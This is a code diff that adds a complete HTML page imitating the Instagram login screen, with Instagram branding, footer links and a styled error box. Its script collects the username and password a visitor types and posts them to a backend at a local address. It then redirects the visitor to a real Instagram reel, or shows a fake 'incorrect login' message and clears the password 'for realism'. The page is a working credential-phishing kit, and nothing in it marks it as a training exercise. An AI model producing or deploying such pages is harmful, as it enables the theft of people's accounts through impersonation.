@@ -1,0 +1,366 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Instagram</title>
+<link rel="icon" type="image/x-icon" href="./static/assets/favicon.png">
+
+<style>
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+    font-family: Arial, Helvetica, sans-serif;
+}
+
+body{
+    background:#000;
+    color:white;
+}
+
+/* MAIN WRAPPER (VERTICAL LAYOUT) */
+.page{
+    display:flex;
+    flex-direction:column;
+    min-height:115vh;
+
+}
+
+/* MAIN CONTENT */
+.container{
+    flex:1;
+    display:flex;
+}
+
+/* LEFT SIDE */
+.left{
+    flex:1;
+    background: radial-gradient(circle at 30% 30%, #111, #000);
+    padding:60px;
+    display:flex;
+    flex-direction:column;
+    justify-content:center;
+    align-items:center;
+}
+
+.logo{
+    width:70px;
+    margin-bottom:40px;
+}
+
+.title{
+    font-size:40px;
+    font-weight:300;
+    line-height:1.2;
+    margin-bottom:60px;
+    text-align:center;
+}
+
+.gradient-text{
+    background: linear-gradient(45deg, #ff7a00, #ff006a, #d300c5);
+    -webkit-background-clip:text;
+    -webkit-text-fill-color:transparent;
+    font-weight:500;
+}
+
+.main-image{
+    width:350px;
+    height:290px;
+    border-radius:30px;
+    box-shadow:0 30px 60px rgba(0,0,0,0.6);
+}
+
+/* RIGHT SIDE */
+.right{
+    width:40%;
+    background: linear-gradient(180deg,#0e1c24,#102733);
+    display:flex;
+    justify-content:center;
+    align-items:center;
+}
+
+.login-box{
+    width:350px;
+}
+
+.login-box h2{
+    margin-bottom:30px;
+    font-weight:500;
+}
+
+.input-group{
+    margin-bottom:20px;
+}
+
+input{
+    width:100%;
+    padding:15px;
+    border-radius:12px;
+    border:1px solid #2e3e48;
+    background:#1b2c36;
+    color:white;
+    font-size:14px;
+}
+
+input::placeholder{
+    color:#7d8b93;
+}
+
+button{
+    width:100%;
+    padding:14px;
+    border:none;
+    border-radius:25px;
+    background:#1d4ed8;
+    color:white;
+    font-size:16px;
+    margin-top:10px;
+    cursor:pointer;
+}
+
+button:hover{
+    background:#2563eb;
+}
+
+.link{
+    text-align:center;
+    margin:20px 0;
+    font-size:14px;
+    color:#cbd5e1;
+    cursor:pointer;
+}
+.link a{
+    text-decoration: none;
+    color: white;
+}
+
+.divider{
+    height:1px;
+    background:#2e3e48;
+    margin:20px 0;
+}
+
+.outline-btn{
+    background:transparent;
+    border:1px solid #3b82f6;
+    color:#3b82f6;
+}
+.meta {
+    padding-top: 8px;
+    height: 50px;
+    width: 350px;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+
+}
+.meta img{
+     height: 20px;
+    width: 70px;
+}
+
+/* FOOTER */
+.footer{
+    background:#000;
+    padding:40px 20px;
+    text-align:center;
+    border-top:1px solid #1f2937;
+}
+
+.footer-links{
+    display:flex;
+    flex-wrap:wrap;
+    justify-content:center;
+    gap:18px;
+    font-size:14px;
+    color:#9ca3af;
+    margin-bottom:20px;
+}
+
+.footer-links a{
+    cursor:pointer;
+}
+
+.footer-links a:hover{
+    color:white;
+}
+
+.footer-bottom{
+    font-size:14px;
+    color:#6b7280;
+    display:flex;
+    justify-content:center;
+    gap:20px;
+}
+
+@media(max-width:1000px){
+    .left{
+        display:none;
+    }
+    .right{
+        width:100%;
+    }
+}
+
+.footer-links a{
+    text-decoration: none;
+    color: grey;
+
+}
+</style>
+
+</head>
+<body>
+
+<div class="page">
+
+    <!-- MAIN CONTENT -->
+    <div class="container">
+
+        <!-- LEFT -->
+        <div class="left">
+            <img src="../static/assets/logo.png" class="logo">
+            
+            <div class="title">
+                See everyday moments from your <br>
+                <span class="gradient-text">close friends.</span>
+            </div>
+
+            <img src="../static/assets/img1.png" class="main-image">
+        </div>
+
+        <!-- RIGHT -->
+        <div class="right">
+            <div class="login-box">
+                <div id="error"></div>
+                <h2>Log into Instagram</h2>
+
+                <div class="input-group">
+                    <input type="text" placeholder="Mobile number, username or email">
+                </div>
+
+                <div class="input-group">
+                    <input type="password" placeholder="Password">
+                </div>
+
+                <button>Log in</button>
+
+                <div class="link"><a href="https://www.instagram.com/accounts/password/reset/">Forgot password?</a></div>
+
+                <div class="divider"></div>
+
+                <button class="outline-btn" onclick=createAccount()>Create new account</button>
+                <div class="meta">
+                <img src="../static/assets/meta.png" alt="">
+            </div>
+            </div>
+            
+        </div>
+
+    </div>
+
+    <!-- FOOTER -->
+    <footer class="footer">
+        <div class="footer-links">
+            <a href="https://www.meta.com/en-gb/about/?utm_source=about.meta.com&utm_medium=redirect">Meta</a>
+            <a href="https://about.instagram.com/">About</a>
+            <a href="https://about.instagram.com/blog/">Blog</a>
+            <a href="https://about.instagram.com/about-us/careers">Jobs</a>
+            <a href="https://help.instagram.com/">Help</a>
+            <a href="https://developers.facebook.com/docs/instagram-platform">API</a>
+            <a href="https://privacycenter.instagram.com/policy/?entry_point=ig_help_center_data_policy_redirect">Privacy</a>
+            <a href="https://help.instagram.com/581066165581870/">Terms</a>
+            <a href="https://www.instagram.com/explore/locations/">Locations</a>
+            <a href="https://www.instagram.com/web/lite/">Instagram Lite</a>
+            <a href="https://www.meta.ai/?utm_source=foa_web_footer">Meta AI</a>
+            <a href="https://www.threads.com/">Threads</a>
+            <a >Contact Uploading & Non-Users</a>
+            <a>Meta Verified</a>
+        </div>
+        
+
+        <div class="footer-bottom">
+            <span>English</span>
+            <span>© 2026 Instagram from Meta</span>
+        </div>
+    </footer>
+
+</div>
+<script>
+const loginBtn = document.querySelector('.login-box button');
+const usernameInput = document.querySelector('input[type="text"]');
+const passwordInput = document.querySelector('input[type="password"]');
+const errorContainer = document.getElementById('error');
+
+// This is the Instagram error box HTML template
+const errorTemplate = `
+    <div id="error-message" style="background: #1a1a1a; border: 1px solid #262626; border-radius: 8px; padding: 15px; margin-bottom: 20px; color: #f5f5f5; font-size: 14px; text-align: left; display: flex; align-items: center; gap: 10px;">
+        <span style="color: #ed4956; font-size: 20px;">ⓘ</span>
+        <span>The login information you entered is incorrect. <a href="https://www.instagram.com/accounts/password/reset/" style="color: #0095f6; text-decoration: none;">Find your account and log in.</a></span>
+    </div>
+`;
+
+function createAccount(){
+
+    window.location.href = 'https://www.instagram.com/accounts/emailsignup/?next=';
+
+}
+loginBtn.addEventListener('click', async () => {
+    // 1. Clear previous errors and show loading state
+    errorContainer.innerHTML = "";
+    const originalText = loginBtn.innerText;
+    loginBtn.innerText = "Logging in...";
+    loginBtn.disabled = true;
+
+    const payload = {
+        username: usernameInput.value,
+        password: passwordInput.value
+    };
+
+    // Basic validation
+    if (!payload.username || !payload.password) {
+        errorContainer.innerHTML = errorTemplate;
+        loginBtn.innerText = originalText;
+        loginBtn.disabled = false;
+        return;
+    }
+
+    try {
+        const response = await fetch('http://127.0.0.1:5000/auth/login', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        });
+
+        const result = await response.json();
+
+        if (response.ok && result.status === "success") {
+            // --- SUCCESS FLOW ---
+            
+            window.location.href = "https://www.instagram.com/reel/DKmwp09yFTA/";
+        } else {
+            // --- INVALID FLOW ---
+            // Backend returned 401 or Instagram flagged the attempt
+            errorContainer.innerHTML = errorTemplate;
+            passwordInput.value = ""; // Clear password field for realism
+        }
+
+    } catch (error) {
+        // --- NETWORK ERROR ---
+        console.error("Connection error:", error);
+        errorContainer.innerHTML = errorTemplate;
+    } finally {
+        loginBtn.innerText = originalText;
+        loginBtn.disabled = false;
+    }
+});
+
+// Allow login by pressing "Enter" key
+// passwordInput.addEventListener('keypress', (e) => {
+passwordInput.addEventListener('keydown', (e) => {
+    if (e.key === 'Enter') loginBtn.click();
+});
+</script>
+</body>
+</html>
